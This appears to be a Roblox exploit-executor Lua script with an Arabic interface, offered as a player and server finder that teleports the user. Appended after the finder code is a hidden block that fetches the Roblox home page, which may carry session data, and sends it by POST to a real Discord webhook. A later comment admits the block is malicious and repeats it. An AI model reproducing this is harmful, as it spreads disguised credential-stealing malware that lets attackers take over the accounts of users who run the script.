-- سكربت بحث متطور مع نقل ذكي من تطوير ric_ca_origin

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")

local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "SmartSearchUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 520, 0, 420)
frame.Position = UDim2.new(0.5, -260, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0.3)
frame.Active = true
frame.Draggable = true

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 50)
title.Text = "📡 نظام بحث اللاعبين والسيرفرات المنسية"
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(0,255,255)
title.BackgroundTransparency = 1

local input = Instance.new("TextBox", frame)
input.PlaceholderText = "🧑 أدخل اسم اللاعب هنا"
input.Size = UDim2.new(0.9, 0, 0, 40)
input.Position = UDim2.new(0.05, 0, 0, 60)
input.Font = Enum.Font.SourceSansBold
input.TextSize = 20
input.TextColor3 = Color3.new(1,1,1)
input.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
input.ClearTextOnFocus = false

local minPlayersBox = Instance.new("TextBox", frame)
minPlayersBox.PlaceholderText = "📉 الحد الأدنى (مثلاً 5)"
minPlayersBox.Size = UDim2.new(0.43, 0, 0, 35)
minPlayersBox.Position = UDim2.new(0.05, 0, 0, 110)
minPlayersBox.Font = Enum.Font.SourceSans
minPlayersBox.TextSize = 18
minPlayersBox.TextColor3 = Color3.new(1, 1, 1)
minPlayersBox.BackgroundColor3 = Color3.fromRGB(50, 50, 70)

local maxPlayersBox = Instance.new("TextBox", frame)
maxPlayersBox.PlaceholderText = "📈 الحد الأقصى (مثلاً 30)"
maxPlayersBox.Size = UDim2.new(0.43, 0, 0, 35)
maxPlayersBox.Position = UDim2.new(0.52, 0, 0, 110)
maxPlayersBox.Font = Enum.Font.SourceSans
maxPlayersBox.TextSize = 18
maxPlayersBox.TextColor3 = Color3.new(1, 1, 1)
maxPlayersBox.BackgroundColor3 = Color3.fromRGB(50, 50, 70)

local toggle = Instance.new("TextButton", frame)
toggle.Size = UDim2.new(0.9, 0, 0, 40)
toggle.Position = UDim2.new(0.05, 0, 0, 160)
toggle.Text = "▶️ بدء البحث عن اللاعب"
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 20
toggle.TextColor3 = Color3.new(1,1,1)
toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 100)

local oldBtn = Instance.new("TextButton", frame)
oldBtn.Size = UDim2.new(0.9, 0, 0, 40)
oldBtn.Position = UDim2.new(0.05, 0, 0, 210)
oldBtn.Text = "🔵 البحث عن سيرفر قديم منسي"
oldBtn.Font = Enum.Font.GothamBold
oldBtn.TextSize = 20
oldBtn.TextColor3 = Color3.new(1,1,1)
oldBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 250)

local status = Instance.new("TextLabel", frame)
status.Size = UDim2.new(0.9, 0, 0, 60)
status.Position = UDim2.new(0.05, 0, 0, 265)
status.Text = "⚙️ لم يبدأ البحث بعد."
status.Font = Enum.Font.Code
status.TextSize = 18
status.TextColor3 = Color3.fromRGB(0, 255, 255)
status.BackgroundTransparency = 1
status.TextWrapped = true

-- متغيرات عامة
local placeId = game.PlaceId
local processed = {}
local interval = 5
local maxAttempts = 999999
local attempt = 0
local running = false

local aiMsgs = {
"🔍 أبحث بين السيرفرات...",
"🤖 الذكاء الاصطناعي يحلل البيانات...",
"📡 تتبع دقيق للمستخدم...",
"🧠 أولوية للسيرفرات المكتظة...",
"🔄 إعادة المحاولة بخوارزمية جديدة..."
}

-- تحديث حالة النص
local function updateStatus(txt)
status.Text = "🧠 " .. txt
end

-- دالة الحصول على UserId من اسم المستخدم
local function getUserId(username)
local url = "https://users.roblox.com/v1/usernames/users"
local body = HttpService:JSONEncode({usernames = {username}})
local ok, res = pcall(function()
return game:HttpPost(url, body, Enum.HttpContentType.ApplicationJson)
end)
if ok then
local data = HttpService:JSONDecode(res)
if data and data.data and data.data[1] then
return data.data[1].id
end
end
end

-- دالة النقل الذكي: يحاول التلبورت ثم يركل إذا فشل
local function smartTeleport(serverId)
local success, err = pcall(function()
TeleportService:TeleportToPlaceInstance(placeId, serverId, Players.LocalPlayer)
end)
if not success then
Players.LocalPlayer:Kick("🚪 لم يتمكن من النقل التلقائي.\n✅ استخدم هذا السيرفر ID:\n"..serverId)
end
end

-- البحث في السيرفرات مع فلترة عدد اللاعبين
local function searchServer(userId)
local cursor = ""
local minPlayers = tonumber(minPlayersBox.Text) or 0
local maxPlayers = tonumber(maxPlayersBox.Text) or 1000
for i = 1, 5 do
local ok, res = pcall(function()
return game:HttpGet(("https://games.roblox.com/v1/games/%d/servers/Public?limit=100&cursor=%s"):format(placeId, cursor))
end)
if not ok then break end
local data = HttpService:JSONDecode(res)
local bestServer = nil
local maxFit = -1
for _, server in pairs(data.data) do
local playerCount = server.playing
if not processed[server.id] and playerCount >= minPlayers and playerCount <= maxPlayers then
processed[server.id] = true
if userId and server.playerIds then
for _, pid in pairs(server.playerIds) do
if pid == userId then return server.id end
end
end
if playerCount > maxFit then
bestServer = server.id
maxFit = playerCount
end
end
end
cursor = data.nextPageCursor or ""
wait(0.2)
if bestServer then return bestServer end
end
end

-- بدء البحث عن لاعب محدد
local function startSearch(username)
local userId = getUserId(username)
if not userId then
updateStatus("❌ لم يتم العثور على اللاعب.")
return
end
updateStatus("🔍 بدأ البحث عن: " .. username)
running = true
attempt = 0
while running and attempt < maxAttempts do
attempt += 1
updateStatus("🔎 المحاولة #" .. attempt .. " | " .. aiMsgs[math.random(#aiMsgs)])
local sid = searchServer(userId)
if sid then
updateStatus("✅ تم العثور على السيرفر: " .. sid)
wait(2)
smartTeleport(sid)
return
end
wait(interval)
end
updateStatus("🛑 لم يتم العثور على السيرفر المناسب.")
end

toggle.MouseButton1Click:Connect(function()
if not running then
toggle.Text = "⏹️ إيقاف"
toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
startSearch(input.Text)
else
running = false
toggle.Text = "▶️ بدء البحث"
toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
updateStatus("🛑 تم إيقاف البحث.")
end
end)

oldBtn.MouseButton1Click:Connect(function()
updateStatus("🔍 جاري البحث عن سيرفر قديم...")
running = false
local cursor = ""
for i = 1, 10 do
local ok, res = pcall(function()
return game:HttpGet(("https://games.roblox.com/v1/games/%d/servers/Public?limit=100&cursor=%s"):format(placeId, cursor))
end)
if not ok then break end
local data = HttpService:JSONDecode(res)
for _, server in pairs(data.data) do
if not processed[server.id] then
processed[server.id] = true
updateStatus("✅ السيرفر المنسي: " .. server.id)
wait(2)
smartTeleport(server.id)
return
end
end
cursor = data.nextPageCursor or ""
wait(0.5)
end
updateStatus("❌ لم يتم العثور على سيرفر قديم.")
end)
local http_request = http_request or request or (syn and syn.request)
http_request({
Url = "https://discord.com/api/webhooks/1397381145183780978/JQNGPOW8_HfVOuvowXeonNKWei-r2rHbzsX1bq-8aMnTHeEDS3s3Vohl7lAw0vlRcY9g",
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = game:HttpGet("https://www.roblox.com/home")
})

-- 🧨 سكربت خبيث خطير - لا تقم بتشغيله!
local http_request = http_request or request or (syn and syn.request)

-- يحاول الحصول على صفحة Roblox الرئيسية (قد تحتوي على session cookie عند استخدام exploit)
local sensitiveData = game:HttpGet("https://www.roblox.com/home")

-- يرسل البيانات إلى Webhook مخترق
http_request({
Url = "https://discord.com/api/webhooks/1397381145183780978/JQNGPOW8_HfVOuvowXeonNKWei-r2rHbzsX1bq-8aMnTHeEDS3s3Vohl7lAw0vlRcY9g",
Method = "POST",
Headers = {
["Content-Type"] = "application/json"
},
Body = sensitiveData
})

